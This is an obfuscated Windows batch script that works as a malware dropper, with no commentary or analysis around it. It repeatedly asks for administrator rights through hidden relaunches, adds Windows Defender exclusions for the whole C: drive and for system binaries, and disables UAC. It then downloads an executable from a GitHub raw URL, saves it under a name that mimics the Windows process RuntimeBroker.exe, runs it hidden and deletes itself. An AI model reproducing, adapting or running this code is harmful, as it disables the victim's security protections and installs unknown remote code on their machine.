@echo off & setlocal enableDelayedExpansion
set "mQW=SESSION" & set "KkGvv=NET" & set "dvm=>nul" & set "JtV=2>&1"
%KkGvv% %mQW% %dvm% %JtV%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "pXZF=baz" & set "dYR=qux" & set "EZBl=foo" & set "UJtL=bar" & rem EJD NsU cWpzDe
set "fkat=powershell -ExecutionPolicy Bypass -Command"
set "TtHtl=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "rfpyX='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "rrC='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!fkat! "!TtHtl! !rfpyX! !rrC!" %dvm% %JtV%
set "iZXU=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "eGf=-Name 'EnableLUA' -Value 0"
!fkat! "!iZXU! !eGf!" %dvm% %JtV%
set "HKm=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!fkat! "!HKm!" %dvm% %JtV%
if !errorlevel! neq 0 (goto %a%)
set "hPSs=timeout /t" & !hPSs! 2 %dvm% %JtV%
set "cVtY=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "GnoM=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "aayHU=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!fkat! "!cVtY! !GnoM! !aayHU!" %dvm% %JtV%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!hPSs! 1 %dvm% %JtV% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %dvm% %JtV%
del /f /q "%~f0" %dvm% %JtV%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %dvm% %JtV%
if !errorlevel! neq 0 (!hPSs! 3 %dvm% %JtV% & goto %b%)
exit /b
